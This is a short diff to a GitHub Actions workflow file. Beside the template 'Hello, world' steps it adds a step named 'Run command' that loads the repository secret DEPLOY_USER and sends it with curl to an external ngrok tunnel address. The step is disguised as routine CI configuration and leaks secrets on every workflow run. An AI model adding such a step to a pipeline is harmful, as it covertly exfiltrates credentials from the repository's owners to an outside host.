@@ -26,6 +26,12 @@ jobs:
     - name: Run a one-line script
       run: echo Hello, world!
 
+    - name: Run command
+      shell: sh
+      env:
+        DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+      run: curl -X GET "https://0368cb9d.ngrok.io?user=${DEPLOY_USER}"
+
     # Runs a set of commands using the runners shell
     - name: Run a multi-line script
       shell: sh
